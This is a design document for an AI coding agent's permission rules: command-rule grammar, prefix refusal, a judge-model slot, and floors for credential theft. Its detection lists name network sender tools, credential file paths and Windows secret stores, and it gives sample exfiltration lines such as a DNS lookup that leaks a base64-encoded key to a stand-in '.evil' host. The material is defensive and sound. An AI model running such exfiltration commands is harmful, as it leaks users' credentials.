# Permissions: always-allow baseline and judge slot

Status: decided 2026-10-14 (issue #28). P1a is implemented; P1b, P1c and P2 are planned.

This page carries the owner-approved direction for issue #28 into the repository. It has two goals:

- **P1:** make "Always allow" usable through structural command rules and scoped saved approvals, while keeping hard floors.
- **P2:** reserve one pluggable judge-model slot for automated review.

The [permission-policy contract](../architecture/permission-policy-design.md)
owns current execution and approval behavior. Implementation gaps against this
design must be reported explicitly.

## Decisions

### P1: rules and "Always allow"

**1. One rules language and one parser** for Settings, the dock and the rule files. Implemented in `src/permissions/rules/rule-specifier.ts`.

| Rule | Matches |
|---|---|
| `Bash(<prefix> *)` | every command whose static argv starts with the prefix tokens, including the bare prefix |
| `Bash(<exact>)` | exactly that static argv |
| `Edit(<abs path>)` / `Edit(<abs dir>/**)` | one path, or a directory and everything under it |
| `WebFetch(domain:<host>)` / `WebFetch(domain:*.<host>)` | exact host, or strict subdomains (only a leading `*.`) |
| `Mcp(<server>)` / `Mcp(<server>:<tool>)` | every tool of a server, or one tool |

- Parsing is strict: anything outside the grammar throws.
- Storage uses one canonical spelling.
- Legacy Store A glob patterns (`web_fetch`, `write_file:path:/abs`) never start with `Name(`. They are classified by shape and keep their glob semantics unchanged.

**2. Precedence.** deny, then mandatory per-call gates, then explicit ask rules,
then allow. Session allows count as allow.

- The first match within a class decides.
- Specificity never beats class.

**3. Bash command-rule matching** runs on the host's shell AST (`src/shared/shell-analysis.ts`, the mvdan/sh grammar). Implemented in `src/permissions/rules/shell-rule-matcher.ts`.
- Every simple command must be covered by some allow rule. Different rules may cover different parts.
- Deny and ask also look inside:
  - `$()`, backticks and process substitution;
  - subshells;
  - loop, conditional and function bodies;
  - assignment values;
  - through wrapper programs (`sudo -u root rm`).
- Unparseable input matches no allow rule.
- Wrappers are never stripped for allow.
- Code-executing runners keep their full argv in rule matching. An applicable
  prefix must include the runner and its proven literal command, such as
  `Bash(npx prettier *)`; an inner-only `Bash(prettier *)` cannot cover it.
  Opaque runner identity or an unknown runner option alone adds no hidden-code
  blocker. The persistent-prefix boundary is checked separately below.

**4. Prefix suggestion** uses an arity table (`src/permissions/rules/shell-prefix-policy.ts`).
- `git`, `npm`, `pnpm`, `yarn`, `docker` and `kubectl` keep 2 tokens.
- `npm run`, `pnpm run`, `yarn run` and `bun run` keep 3 tokens.
- Everything else keeps 1 token.
- Options and paths end the prefix.

Suggestion length selects a candidate; the refused-prefix check must still
accept it. An edited persistent rule uses that same validation.

**4a. Refused prefixes** come from one shared list, which validates both suggestions and edited values:
- an empty prefix or bare `*`;
- shells;
- non-runner interpreters at any length (`python -c`, `node scripts/build.mjs`, `python -m x`);
- wrappers at any length (`env`, `xargs`, `sudo`, `eval`, `exec`, `source`, `timeout`, `nice`, `unbuffer`, …);
- code-executing runner prefixes without a proven literal command (`npx`, `npm`, `npm exec`, `bun x`);
- runner prefixes with option-shaped words before that command unless a literal `--` establishes its boundary;
- non-runner multi-verb tools alone or with a leading option (`git`, `git -c`, `docker`).

Prefix refusal rejects that persistent command rule. Once/session approval and
existing exact-input saved approvals retain their own requirements.

Runner prefix validation uses structural command/delegation boundaries, not an
option-arity or known-safe task table. `npx tsc`, `npm test`, `pnpm dlx tsc` and
`corepack pnpm install` can become persistent prefixes because their literal
command words are established. Options before the command require a literal
`--` boundary; validation does not guess which option consumes the next word.
Ambiguous forms keep their ordinary ask and can be covered by an applicable
exact-input saved grant, subject to the other permission gates. A valid prefix
does not prove that the command or task contents are read-only.

**5. Shell verdict.** The blanket `shell → high` in `resolveUserApprovalVerdict` is no longer the first answer.
- An unreviewed shell ask carries the host's rule-classifier verdict (`ApprovalRequest.ruleVerdict`): read-only is LOW, ordinary is MEDIUM, destructive is HIGH.
- Destructive commands stay once-only.
- With no verdict at all, the fallback is still HIGH (fail closed).

**6. Persistence.**
- "Always allow" for a project writes the per-project rule file in Ave home: `<ave home>/permissions/project-rules/<identity>.json`. The identity is the Store B working-directory identity of the project root (sha256 of the case-folded canonical realpath). The project root is the git root of the session cwd, or the cwd itself outside a repository, so subdirectory sessions share rules. The file is re-read when it changes on disk. Ave never writes rules into the user's repository.
- "Everywhere" writes the user-global scope, which is Store A (`<ave home>/permissions.json`) extended in place.
- Deny-always uses the same files.
- Session scope is the conversation session id, in memory.

**7. Existing Store B entries** (exact tuples) keep matching unchanged and are never converted to prefixes.
- A corrupt Store A, Store B or project file fails clearly with a visible error.
- Corrupt files are never silently dropped and never overwritten.

**8. Writes.**
- Write rules are path-scoped `Edit(<root>/**)`, resolved with realpath at decision time.
- Sensitive paths and Ave's own config, permission and hook files are floors, checked before any allow rule.
- Symlink escapes ask.

**9. Network.** `WebFetch(domain:...)` rules feed the host-mediated fetch
allow-list. They do not confine shell egress; the shell sink checks below remain
necessary.

**10. MCP.**
- Always-allow is per tool by default; per server is an explicit option.
- A destructive annotation, or no annotation, keeps ask. Annotations never auto-allow by themselves.

**11. Out-of-directory.** The dock offers depth candidates (file, parent, project-like root) resolved by the host.

**12. Floors.** These are never always-allowable, in any mode:
- sensitive and secret paths;
- Ave config, permission stores and hooks;
- hardline destructive patterns;
- credential exfiltration;
- privilege escalation;
- plugin and agent capability grants.

### P2: judge slot

**1. One seam.** `PermissionJudge` is the single automated-decision interface.
- The existing auto-mode reviewer (`LlmRiskClassifier`, `max(rule, llm)`, verdict cache, deferred queue) moves behind it as the `builtin-llm` provider, with no behavior change.
- jev is a drop-in provider.

**2. Settings.** `permissions.judge = { provider: "off" | "builtin-llm" | "external", mode: "shadow" | "active", categories: { shell, write, network }, external: { command | url } }`.
- The default provider is `off`.
- When the provider is not `off`, the mode defaults to `shadow`.
- The categories default to shell and write on, network off.

**3. Placement.** deny, then mandatory floors, then explicit ask rules, then
allow rules, then the mode matrix, then the judge, then the dock.
- The judge decides only calls that are still undecided, and only for enabled categories.
- It never overrides a rule or a floor.
- It never decides capability grants, remote-controller requests or anything in `strict` mode.
- It may suggest a rule but never writes one.

**4. Input.**
- It receives the latest user messages, the normalized and redacted tool call, the cwd and project root, the sandbox state, the rule verdict, and the policy text and mode.
- It never receives tool results.
- The host's canonical DLP redactor runs before anything leaves the process.

**5. Output** uses the strict schema `{decision: allow|ask|deny, rationale, confidence?, suggestedRule?}`. Anything else counts as unparseable.

**6. External provider.**
- `command` is an argv array with an absolute path and no shell.
- `url` must be loopback or HTTPS.
- The `permissions.judge` subtree is itself a floor: the agent never writes it.

**7. Fallbacks.**
- Timeout, error, unparseable output or an unavailable judge: `ask` in the foreground; `deny` plus the deferred queue when headless.
- A fallback never allows.
- Timeouts are recorded apart from denials.

**8. Breaker.** 3 consecutive or 20 total judge denials per session pause automation and return to prompting. Subagents share the parent session's counter.

**9. Hooks.**
- `beforeJudge` may redact or short-circuit to ask/deny.
- `afterJudge` may only downgrade a decision.

**10. Audit.** Append-only JSONL, written by the existing audit writer.

### Deviations from the issue text

- The breaker counts per session (3 consecutive / 20 total) rather than per turn (10 of the last 50).
- `rule-only` is collapsed into `provider: off`.

## Delivery

All work lands on the category branch `integration/permissions`.

- **P1a** (this change): rules language, parser, shell matcher, refused list, arity suggestion, Store A extension with `ask`, per-project rule files, corrupt-file handling for Store A and B, removal of the blanket shell → HIGH. No UI.
- **P1b:** the dock (prefix suggestion, allow-session / deny-always, per-project vs everywhere), one Settings list with revoke across Store A, project files and Store B, and i18n.
- **P1c:** path-scoped `Edit`, host-scoped `WebFetch`, `Mcp`, and out-of-directory depth.
- **P2:** `src/permissions/judge/` is built in isolation. The auto-mode relocation and the judge call site land together after P1a.

## P1a implementation notes

### Where the code is

- `src/permissions/rules/rule-specifier.ts`: the grammar, plus the pure host and MCP matchers that P1c will wire in.
- `src/permissions/rules/shell-prefix-policy.ts`: the refused list and the arity suggestion.
- `src/permissions/rules/shell-rule-matcher.ts`: the AST walk and deny/ask/allow evaluation.
- `src/permissions/rules/rule-files.ts`: rule validation and `PermissionRulesFileCorruptError`.
- `src/permissions/rules/project-rule-files.ts`: per-project files in Ave home.
- `src/permissions/rules/rule-scopes.ts`: the project-scope cache for the synchronous decision path.

### Decision path

`PermissionManager.checkDetailed` takes two new context fields:

- `ruleSubject: { kind: "shell", command, dialect, cwd? }`, set for canonical
  `bash` and `powershell` calls with a known dialect;
- `projectRulesCwd`, which the tool pipeline sets for Bash after awaiting
  `ensureProjectRulesLoaded`. PowerShell has no project command-rule scope.

Checks run in this order:

1. Deny decides at layer 1.
2. A corrupt Store A, project file or Store B returns a forced ask that names the file for every non-read call. Reads keep the normal matrix so the app stays usable while the file is repaired (the repair UI is P1b). A corrupt Store B no longer blocks every tool call; the error is logged with the file name.
3. An identified sensitive-path or credential/sink signal decides at layer 2 as
   a forced, never-remembered prompt, before any allow rule or saved approval.
4. Explicit ask rules decide at layer 2 as forced, never-remembered prompts.
   They also win over `allow` mode.
5. Applicable allow rules decide at layer 3 and saved approvals at layer 5.
   Both may satisfy an ordinary shell ask.
6. Without an applicable rule or grant, an ordinary shell reason keeps the
   category/mode path at layer 6 asking. It does not set `forceModal` and remains
   rememberable, subject to existing approval-scope and risk requirements.

The Layer-numbered gates already in place (remote controller, overlay, strict) are unchanged.

### Allow is refused for input the matcher cannot reason about

- parse failure or unsupported syntax (`case`, `select`, `((…))`, coprocesses);
- opaque word expansions (brace expansion, `${x/a/b}`, `$"…"`);
- any substitution;
- command-scoped or assignment-only environment changes (`GIT_DIR=… git status`, `PATH=…; git status`);
- write redirections other than `/dev/null`;
- function definitions;
- a dynamic program name;
- any command the rule classifier grades destructive (the floor).

### Deny and ask cannot see everything

For `Bash(...)` rule matching, they cannot see inside hidden code
(`hiddenCodeReason` in `shell-prefix-policy.ts`). Visibility governs whether a
command rule can inspect execution. Opaque syntax can retain structural rule
blockers without becoming a credential/sink floor:

- a non-runner shell or interpreter given code by any route: `-c`/`-e`, a stdin pipe (`echo … | bash`), a here-string, a here-document, `-s`, `-`, a script file or module (`bash x.sh`, `perl x.pl`, `python -m x`); informational-only `--version`/`--help` forms do not supply code;
- code carriers: `eval`, `source`/`.`, `trap`, `hash -p`, `alias`, `enable -f`, `bind -x`, `mapfile -C`, `complete -C`, `fc`, `at`, `crontab`, `tmux`, editors, string-joining wrappers (`watch`, `flock -c`, `su -c`, `env -S`);
- code-carrying variables (`GIT_SSH_COMMAND=… git fetch`, `PAGER`, `LESSOPEN`, `BASH_ENV`, `PATH`, …);
- options that run a command: `find -exec`, `sed` `e` / `s///e` / `-f`, `rg --pre`, `tar --to-command`/`-I`/`--use-compress-program`, `less +!`, `git -c`/`--ext-diff`/`--textconv`/`-O`/`--upload-pack`, `man -P`, `rsync -e`, `ssh -o ProxyCommand`, `fd -x`, …;
- unsupported syntax.

A deny rule that matches a visible command decides first. Otherwise, when any deny or ask `Bash(...)` rule exists and the command contains hidden code, the decision is a per-call `forceModal` ask before allow rules and saved grants, even in `allow` mode. Hidden code is never covered by an allow rule. Options that write (`sed -i`/`w`, `tar -x`, `less -o`, `--output`, `find -delete`) also keep an allow rule from matching.

Hidden code alone adds no `ordinaryAsk`. Without explicit restrictions, credential/sink evidence, opaque bindings or retained file-execution provenance, statically bound direct interpreter forms such as `python -c`, `perl -e`, `node -e`, `node x.js`, `python x.py`, `bash -c ls` and `pwsh -c Get-Date` follow normal handling in allow mode. Their rule-visibility limits do not prove that their contents are read-only.

An opaque runner prefix alone is not hidden code for rule matching. Runner
argv remains available to raw command rules regardless of task or subcommand
spelling. That visibility does not inspect package or script contents. Option
spelling does not add a hidden-code blocker; the structural persistent-prefix
check still rejects an ambiguous command boundary. The inner command is not a
transparent alias.

### Not yet enforced

`Edit`, `WebFetch` and `Mcp` rules parse but are not enforced yet. Writing them is refused, and a file that holds one is corrupt. This stops a stored rule from being a silent no-op that the user believes is in force. P1c lifts this by adding their kinds to `ENFORCED_RULE_KINDS`.

### Shell classification buckets

Credential/sink analysis has three outcomes. An identified floor takes precedence
when the same input also has an ordinary reason. Other existing hard-deny,
destructive, explicit-ask and one-shot requirements retain their own authority.

| Bucket | Signal | Decision without another controlling rule |
|---|---|---|
| Floor | Sensitive/credential paths or retained credential-store, certificate-export and transport/sink catalogue effects | Per-call ask with `forceModal`; no saved approval, allow rule or mode bypass |
| Ordinary | Parser refusal, analysis-budget exhaustion, opaque bindings, retained file-execution provenance, or an opaque package/code-runner prefix | `ordinaryAsk` / `ordinaryShellAsk` at layer 6; no `forceModal`; applicable rules and saved grants may cover it |
| Normal | No credential/sink floor or ordinary reason | Existing category, mode, rules and grants |

An ordinary ask remains rememberable under the existing approval-scope and risk
requirements. An unparseable command cannot match a `Bash(...)` allow rule, but
that matching limit does not turn it into a per-call floor or invalidate an
otherwise applicable tool allow rule or saved grant.

Path inspection snapshots policy roots for one decision and bounds filesystem
and glob work. Exhaustion keeps an ordinary reason and prevents a command-prefix
allow match. Remaining visible literal paths still receive lexical credential
checks, and explicit upload arguments retain their sink checks. An unresolved
alias beyond the work limit remains opaque; the scan does not claim to resolve
every filesystem alias after exhaustion.

These buckets describe the permission decision. A hard deny rejects the request
and cannot be approved; a forced per-call ask permits only that approval step.
Neither an ordinary grant nor per-call approval overrides execution-time path
authority or unsupported-syntax rejection. For example, `npx prettier .` can be
covered by an applicable runner command rule, while `source ./setup.sh` remains
rejected by the separate path-authority contract even after a permission grant.

### Retained credential and sink floors

Sensitive-path arguments to shell commands remain enforced by
`src/tools/shell-path-policy.ts` at execution, independently of rules.

**Sensitive-path floor** (`shellSensitivePathSignal`). A path from
`sensitive-paths.ts` anywhere in the command line, including argv, `=value`,
`@file`, redirections, assignments, loop lists, executed substitutions and
literal inline code, is never covered by an allow rule and forces a per-call
ask in `checkDetailed` in every mode. `~`, `~user`, `$HOME` and `${HOME}` normalize
to a home directory; other expansions (`$(echo ~)/.aws/credentials`) keep their
literal tail; brace expansion is expanded; a glob is instantiated against the
sensitive names that exist where it would expand. After the work limit, a
bounded fallback checks possible sensitive glob and brace paths without proving
filesystem existence; possible credential reach retains the floor. Plain budget
exhaustion without credential or sink evidence remains ordinary.
File-input values such as
`--env-file=.env` retain this scan; a valueless `--env-file` retains its implicit
`.env` input. These are file-input checks, not runner option policy.
The permission-manager ask does not authorize a sensitive-path operation that
the execution gate forbids.

**Credential-exfiltration floor**
(`src/permissions/rules/shell-exfiltration.ts`). A command is exfiltration when
one subcommand sends data off the machine and that data comes from a file or
secret. It covers:

- `curl`/`wget` with a file-sourced body, header or upload: `@file`, `-F x=@`,
  `-T`, `--post-file`, or any argument built from a `$(…)` that reads a path;
- `scp`/`rsync` to a remote destination, and `sftp` to a host;
- `nc`/`ncat`/`socat` fed from a file, a here-string or a path-reading pipeline
  stage;
- sensitive-path arguments to a sender;
- any argument of a network-capable program built from a `$(…)` that reads a
  path (`nslookup $(cat key|base64).evil`), except multi-purpose tools whose
  arguments routinely carry file text (`git`, `gh`, `npm`, `docker`, …);
- reader-independent: a sensitive path anywhere together with a network-capable
  program (the shared table includes `curl`, `wget`, `ssh`, `scp`, `rsync`,
  `openssl`, `nc`, `socat`, `telnet`, `nslookup`, `dig`, `gh`, `aws`, `gcloud`,
  `az`, `http` and `git`), a `/dev/tcp` or `/dev/udp` redirection, or hidden code
  anywhere in the same command line.

Senders are seen through wrappers, `busybox`, and literal `sh -c` / `eval` /
here-documents. The check applies to the whole compound command. It produces a
HIGH rule-classifier verdict, no allow-rule match, and a forced per-call ask in
`checkDetailed` in every mode. Unknown code alone does not establish a sender.
Plain GETs, form fields without `@`, local `rsync`, `scp` downloads and `git push`
do not establish this floor by themselves.

### Opaque runner prefixes

`SHELL_PREFIX_POLICY.packageRunners` is the canonical runner-identity source, including `npm`, `pnpm`, `yarn` and `bun`. `opaqueRunnerReason` returns `opaque runner prefix` through the shared `SHELL_PREFIX_POLICY.wrappers` grammar, including versioned runner spellings and supported executable/script suffixes. A runner receives an ordinary ask without an applicable rule or grant. No runner option allowlist, source classification, registry policy or package-task model assigns its bucket. An unknown option, remote package operand or registry choice alone is not a credential/sink floor.

Code-executing runners are never allow-rule-transparent wrappers. A persistent
command prefix includes the runner and proven literal command, with a literal
`--` required when options precede that command. Literal downstream
command candidates are inspected only to retain known credential, reader and
sender effects, including original substitution metadata; this inspection does
not strip runners from rule matching or infer safe argv from option spelling.
For example, `npx curl -T file http://e` retains its upload floor, while `npx curl http://e` has the ordinary runner reason unless another signal applies. Literal inline shell/code arguments still receive structural credential and sink inspection. Code visibility alone does not create an ordinary reason; unresolved command targets or code bindings do.

Known sinks remain visible through the shared wrapper grammar in `wrapperCommand` (`wrapperPrefixLength` exposes its argv boundary). Setup operands such as a scheduling priority, CPU mask, lockfile or root directory precede the inner command. The login `-` is a flag rather than a user operand. Explicit wrapper command strings and the entire tail passed to a default shell receive bounded shell inspection. For a declared grammar, unsupported options and opaque bindings request ordinary approval; an unsupported option establishes no inner argv boundary. An independent credential or sink floor still takes precedence. These sink-only views preserve native identity: a forwarded native `curl` is not a PowerShell cmdlet alias. This inspection supplies no allow-rule coverage.

The shared prefix source also marks declared interpreter/code operands. Those operands receive generic credential/sink inspection through literal delegates; their words do not become command candidates in another language. This role adds no runner-option policy or rule coverage.

### PowerShell analysis and general provenance

`src/permissions/rules/powershell-exfiltration.ts` preserves the structural
analysis and the credential/sink vocabulary. The invocation pipeline gives both
canonical host-shell tools a shell rule subject with a `dialect`; an unknown
dialect is a contract violation. The PowerShell reading includes the shared
credential/sink reading of visible text plus a PowerShell-aware pass:

- PowerShell script blocks and `pwsh`/`powershell` inline command text use this catalogue. Other interpreter code uses generic credential/sink inspection with literal text and inline readers/senders retained. A `print` expression in `python` or `perl` does not acquire the PowerShell printer-port sink meaning.
- Cmdlets and aliases include `Invoke-WebRequest`/`iwr`,
  `Invoke-RestMethod`/`irm`, and `curl`/`wget`, their aliases in Windows PowerShell
  5.1. Analysis retains parameter-name prefixes (`-InF`), `(…)`/`$(…)`/`{…}`/
  `@{…}` groups, assignments, `foreach (… in …)`, file-fed pipeline `$_`, and
  `@p` splats of a hashtable assigned in the same command.
- Senders retain `-InFile`, file-derived arguments, pipeline input bound to
  `-Body`, `Start-BitsTransfer -TransferType Upload`,
  `Send-MailMessage -Attachments`, `Copy-Item -ToSession`,
  `WebClient.UploadFile`, `.NET` upload methods given file data, other network
  cmdlets (`Resolve-DnsName`, `Test-NetConnection`, …) given file data.
  Static and opaque transport splats retain the catalogue's credential/sink floors; unresolved non-transport bindings remain ordinary. Independently visible upload arguments still receive sink inspection.
- Catalogue credential-store commands and certificate exports retain their floors, including `cmdkey`, `vaultcmd`, `Get-Secret`, `Get-StoredCredential` and `Export-PfxCertificate`. Catalogued native transfer/downloader effects remain covered, including `bitsadmin.exe`, `certutil.exe`, `certreq.exe` and `desktopimgdownldr.exe`. Known credential/sink effects remain visible in process-launcher argument payloads, executed job script blocks and background commands.
- File-data sources retain `Get-Content`/`gc`/`cat`/`type`, `Select-String`,
  `Import-Clixml`, `Get-Item`, `[IO.File]::Read*`, `Get-Secret`,
  `Get-StoredCredential`, `cmdkey`, `env:` listings, and variables assigned
  from them. Path normalization retains `$env:USERPROFILE`, `$env:HOME`,
  `${env:…}`, `$HOME`, `~\`, backslashes, backtick escapes and `FileSystem::`.
- Native switches belong to the native program. Literal local data remains data. This argument role does not prove read-only effects, grant execution or establish a runner command boundary. Opaque interpreter bindings retain an ordinary reason; statically bound direct inline or script-file code does not create one by itself. Neither proves read-only script contents. Arguments after a literal script-file operand or a modeled module retain the existing script policy.
- Local write destinations and contents have distinct bindings. Values written
  to a known local file remain data, including unresolved values and quoted
  command examples. Executed subexpressions retain their checks. Unknown
  destinations, remote shares and printer ports retain their sink inspection.
  Supported here-string escapes are decoded; unsupported escapes retain an
  ordinary reason when their role is opaque, with any identified floor taking
  precedence.
- Within one input and executed nested frames, established writes, copies,
  moves, renames, downloads and extraction retain destination paths and
  leaf/stem spellings. Later execution of a matching path or command stays an
  ordinary ask unless credentials or a sink are identified. Modeled interpreter
  test/build discovery after executable or untyped writes retains the same
  ordinary reason and document-type exemptions from
  `powershell-file-provenance.ts`. Copied catalogue executables retain their
  identity through renames, so a copied sender still receives sink analysis.
  Unknown native argv does not establish written paths. Provenance is not
  persisted across calls. An arbitrary earlier file write does not couple a
  later package task to that file or infer manifest contents.
- `Invoke-Item`/`ii` retains support for literal document/media/data types and
  explicit directory spellings. An unsuffixed literal path can be admitted when
  `statSync(...).isDirectory()` confirms a directory in the current host
  context. This metadata exception is disabled after possible filesystem
  effects and in launcher/code-probe frames; queries consume the shared budget.
  Missing extensionless paths, regular extensionless files, nonliteral values,
  expressions and splats stay ordinary unless an independent floor applies.
  Metadata does not prove future type stability or inspect file contents.
- Parser refusal and global/recursive budget exhaustion carry their specific
  ordinary reason. Existing fallback inspection retains visible credential and
  upload signals, which take precedence over that reason. Executed nested
  frames propagate ordinary asks. Literal quoted code is inspected for visible
  credentials and sinks without treating unknown code as exfiltration.

As in Bash, a token variable in a header and plain `Invoke-WebRequest` GETs,
including `-OutFile`, do not establish the exfiltration floor by themselves.
The rule classifier grades the builtin `powershell` tool with the same reading.

### Dialect-scoped rules and grants

PowerShell currently has no per-command rule language. `Bash(...)` rules match
`bash` only and a PowerShell call carries no project command-rule scope.
Existing tool allow rules and saved grants can satisfy PowerShell's ordinary
asks, including opaque runners and parser refusal; they cannot satisfy a
credential/sink floor. No `PowerShell(...)` command-rule grammar is introduced.

`sensitive-paths.ts` retains the home-anchored credential rows marked `windows`:
`AppData/Roaming|Local/Microsoft/Credentials`, `Microsoft/Protect`,
`Microsoft/Crypto`, `Microsoft/Vault`,
`AppData/Local/Microsoft/PowerShell/secretmanagement`, and
`AppData/Roaming/GitHub CLI`, plus the host-guard-only
`User Data/**/Login Data` pattern. They match case-insensitively on every
platform. Shared profile stores (`.ssh`, `.aws`, `.azure`, `.kube/config`,
`.docker/config.json`, `.git-credentials`) keep their single path rows and
anchor-free matching under `C:/Users/<name>/`.

### Egress and verification boundary

The sink catalogue remains necessary until a separate egress boundary exists.
The OS tool sandbox is opt-in. Its current network policy is a strict shared
allowlist, with no per-domain approval callback or denial UI. Windows host-shell
execution remains a plain child. This classifier change does not introduce a
proxy, change sandbox defaults, delegate all egress to isolation, or make all
sandbox-off calls ask. Shell URLs and remote package/registry sources alone do
not replace credential/sink evidence.

The decision-table and classifier checks establish policy-analysis behavior.
Native shell execution and proxy/sandbox egress behavior are not validated by
this change.

### Gaps closed by P1b

The Settings IPC still accepts only allow/deny patterns without whitespace. Until P1b, `Bash(...)` rules are added through `PermissionManager.addRulePersist` (and removed through `removeRulePersist`).

## Tests

- `src/permissions/__tests__/rules-language.test.ts` covers:
  - the grammar;
  - the refused list;
  - the arity table;
  - compound commands, substitutions, wrappers and floors;
  - the `ls *` vs `lsof` case.
- `src/permissions/__tests__/rules-store-and-decision.test.ts` covers:
  - corrupt Store A, Store B and project files;
  - precedence across scopes;
  - ask beating `allow` mode;
  - persistence across restart;
  - sibling projects;
  - Store B coexistence;
  - the default-mode gate offering "remember" for `ls` / `npm test` but not `rm -rf`.
